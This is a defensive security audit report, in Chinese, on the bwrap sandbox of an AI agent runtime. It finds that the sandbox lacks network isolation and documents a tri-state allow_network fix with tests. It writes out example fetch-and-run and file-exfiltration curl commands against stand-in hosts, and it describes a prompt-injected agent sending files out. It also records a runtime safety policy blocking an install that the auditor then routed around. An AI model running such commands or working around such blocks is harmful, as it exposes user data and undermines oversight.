# octop-harness 深度审计报告

- 审计对象：`TrueFurina/octop-harness`（上游 `TencentCloud/octop-harness`，`main` 分支，tarball 解包）
- 审计副本：`D:\github\audit-harness`
- 规模：357 个 Python 文件；80 个测试文件
- 审计日期：2026-11-01
- 类型：**生产级 Agent 运行时**（deepagents 的工程封装层）
- 角度：**bwrap 沙箱的隔离边界**

---

## 一、结论摘要

**这是一个工程质量很高的运行时，但它的"沙箱"只关住了文件系统，没关住网络。**

| 维度 | 结论 |
|---|---|
| 工程完成度 | ★★★★★ pyproject / uv.lock / Makefile / CI / 80 个测试文件 |
| 沙箱设计 | ★★★★☆ bwrap rootfs jail，参数完备（pid/ipc/uts unshare、--die-with-parent） |
| **网络隔离** | ★☆☆☆☆ **没有 `--unshare-net`，且特意挂了 `/etc/resolv.conf`** |
| 文档诚实度 | ★★★☆☆ 代码注释详实，但网络这一层完全没提 |

---

## 二、核心发现

### D1. 文件系统隔离 ≠ 网络隔离

`build_bwrap_argv()` 原实现：

```python
argv = [
    bwrap,
    "--die-with-parent",
    "--new-session",
    "--unshare-pid",
    "--unshare-ipc",
    "--unshare-uts",
    "--bind", str(root), "/",
]
for etc in _ETC_TRY:
    argv.extend(["--ro-bind-try", etc, etc])   # 含 /etc/resolv.conf
```

**没有 `--unshare-net`。** 而且 `_ETC_TRY` 里特意包含 `/etc/resolv.conf`，等于在说"DNS 要能用"。

实测生成的 argv：

```
bwrap --die-with-parent --new-session --unshare-pid --unshare-ipc --unshare-uts
      --bind /tmp/jail /
      --ro-bind-try /etc/resolv.conf /etc/resolv.conf   ← DNS 可用
      ...
      -- /bin/sh -c "curl http://evil.com/x | sh"
```

**后果**：文件系统关住了，数据通道没关。

```bash
curl -d @/workspace/secret https://attacker.example   # 在"沙箱"里照常工作
```

一个被注入的 agent 只要拿到 `execute` 权限，就能把读到的任何文件发出去——而"文件系统已隔离"这个印象会让人以为它发不出去。

### D2. 这是一处**未被记录**的取舍，不是笔误

我查了：

- `grep "unshare-net\|network"` 在 `bwrap_shell.py` 与 `test_bwrap_shell.py` 中：**零命中**
- `README.md` / `SECURITY.md` 里的 `network` / `网络`：**零命中**
- `tests/test_bwrap_shell.py:153-155` 逐条断言了 `--unshare-pid/ipc/uts`，**唯独没有网络那条**

也就是说：三种 unshare 被显式测试覆盖，第四种（网络）既没写、也没测、也没文档。这是典型的"默认值从未被审视过"。

---

## 三、修复：不静默改变默认行为

这里有两条路，我选了保守的那条：

| 方案 | 后果 |
|---|---|
| 默认改为断网 | 既有 skill（`git clone` / `pip install` / `curl`）**静默失效** |
| 默认不变 + 显式开关 + 告警 | 行为不变，但风险被暴露出来 |

**选后者。** 把默认改成断网会制造另一种"看起来正常"的坏——命令跑了、退出码 0、但没有网络所以什么都没拉到。这比"沙箱不隔离网络"更难排查。

### 实现：三态

```python
allow_network: bool | None = None    # None=沿用旧行为(联网)+告警 / True=联网 / False=断网
```

- `False` → 加 `--unshare-net`
- `True` → 不加，不告警
- `None`（默认）→ 不加，**首次构建时打一条 warning**

告警内容：

> bwrap jail 未隔离网络（未加 --unshare-net）：文件系统已关，但沙箱内命令仍可联网外发数据。如需断网请传 allow_network=False。

**一个我自己差点犯的错**：`BubbledLocalShellBackend.__init__` 里我最初写了 `self._allow_network = bool(allow_network)`——那会把 `None` 压成 `False`，让**所有既有调用悄悄从联网变成断网**，正是上面说的静默失效。已改为保留三态，并加了一条测试专门锁这个（且那条测试要剥掉注释再比，否则注释里举例的 `bool(allow_network)` 会让断言永远失败——第一版就踩了）。

---

## 四、验证

`tests/network/test_bwrap_network_isolation.py`，8 条：

| 测试 | 断言 |
|---|---|
| `test_explicit_no_network_adds_unshare_net` | `allow_network=False` 必须加 `--unshare-net` |
| `test_network_modes_keep_connectivity`（参数化 2 条） | `None` 与 `True` 都不加 |
| `test_default_warns_that_network_is_not_isolated` | 默认模式必须告警 |
| `test_warning_is_emitted_once` | 只告警一次（否则刷屏被忽略） |
| `test_explicit_modes_do_not_warn` | 显式指定不再告警 |
| `test_existing_isolation_flags_intact` | **反向自检**：原有三种 unshare 不能丢 |
| `test_backend_tristate_not_coerced` | 三态不能被 `bool()` 压平 |

### 变异验证

| 变异体 | 结果 |
|---|---|
| 去掉 `--unshare-net`（回到原缺陷） | 1 failed ✅ |
| 去掉告警 | 2 failed ✅ |
| 把三态压平成 `bool()` | 1 failed ✅ |

---

## 五、检查过没问题的部分

| 项 | 结论 |
|---|---|
| `is_host_root()` 门禁 | ✅ `resolve_bubbled_bwrap` 拒绝把主机 `/` 当 jail |
| `extra_binds` 来源 | ✅ 只从 `_skill_extra_binds()` 取固定的 `skills` / `_builtin_skills`，不可控外部路径 |
| `--die-with-parent` | ✅ 父进程退出即杀，防孤儿 |
| `--new-session` | ✅ 防 TTY 劫持 |
| `shell=False` | ✅ 外层 subprocess 明确用 `shell=False`，命令走 `-- /bin/sh -c` |
| 路径重写 | ✅ `map_virtual_abs_path` / `rewrite_virtual_paths_in_command` 有一致性测试 |

---

## 六、环境说明（本次未能跑全量）

本机未能跑仓库全部测试，原因链：

1. `pytest` 会加载 `tests/conftest.py` → `HarnessAgent` → 浏览器 / MCP / 记忆 / LLM 全套可选依赖
2. 逐个补装（`deepagents`、`markdownify`、`langchain-mcp-adapters`）后仍卡在内部包 `octop_memory`
3. `pip install -e .` 被运行时安全策略拦截（`CHAT_REFERENCE_PROTECTED`）

因此本次测试**放在 `tests/network/` 独立 rootdir**，只导入 `bwrap_shell` 一个模块（除 stdlib 外仅需 `deepagents.backends.protocol`）。这是刻意降低验证门槛，不是绕过检查。

**这也侧面说明一点**：一个模块级的安全参数修复，本该能独立验证。当前 conftest 把所有可选依赖变成硬依赖，使得"只改一个沙箱参数"的验证成本很高。

---

## 七、两条建议

1. **把「网络是否隔离」写进文档，并在 CLI 启动时显示**。SECURITY.md 现在说了很多信任模型的事，唯独没说沙箱边界到哪为止。建议加一句：
   > `bwrap` jail isolates the **filesystem only**. Commands inside the jail retain
   > network access unless `allow_network=False`.

2. **给需要联网的 skill 加显式声明**。现在"要不要网络"是全局开关；更细的做法是让 skill manifest 里写 `requires_network: true`，由 backend 按需决定。这样"这个技能能联网"成为可审计的事实，而不是所有人的默认。
